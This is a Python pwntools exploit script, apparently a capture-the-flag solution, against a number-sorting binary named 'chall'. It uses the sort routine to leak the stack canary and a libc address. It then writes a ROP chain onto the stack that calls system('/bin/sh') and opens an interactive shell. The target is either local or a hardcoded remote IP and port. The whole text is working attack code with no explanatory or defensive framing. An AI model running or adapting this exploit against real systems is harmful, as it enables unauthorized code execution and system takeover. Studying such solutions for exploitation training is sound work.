#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'

PATH = 'app/chall'

HOST = 'localhost'
PORT = 10003

HOST = '103.167.136.89'
PORT = 10051

GDBSCRIPT = '''
set resolve-heap-via-heuristic on
b *main+396
b *main+247
'''

def debug(r):
    if type(r) == process:
        gdb.attach(r, GDBSCRIPT)

def do_sort(numbers, next = False):
    info(f'Sorting {len(numbers)} numbers...')
    r.sendlineafter(b'How many numbers do you have?\n', f'{len(numbers)}'.encode())
    
    for num in numbers:
        r.sendlineafter(b': ', f'{num}'.encode())
    
    sorted_numbers = r.recvlines(3)[-1].split()
    
    r.sendlineafter(b'Do you want to sort more numbers? (y/n)\n', b'y' if next else b'n')
    
    return sorted_numbers

def exploit(r):
    base_number = [0 for _ in range(20)]
    
    leaks = do_sort(base_number + [1, '+', 1, '+'], next = True)

    canary = int(leaks[-1])
    libc_start_main = int(leaks[-2])

    libc.address = libc_start_main - 0x29d90

    info(hex(canary))
    info(hex(libc_start_main))
    info(hex(libc.address))

    rop = ROP(libc)
    rop.call(libc.sym.system, [next(libc.search(b'/bin/sh')), 0, 0])
    rop = bytes(rop)
    rop = [u64(rop[i:i+8]) for i in range(0, len(rop), 8)]

    for i in range(len(rop)-1, -1, -1):
        do_sort(base_number + [0, 0, 0] + [0] * i + [rop[i]], next = True)

    pause()    
    do_sort(base_number + [1, canary])

    r.interactive()

if __name__ == '__main__':
    elf = ELF(PATH, checksec=True)
    libc = ELF('./libc.so.6', checksec=False)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = elf.process(aslr=False, env={})
    exploit(r)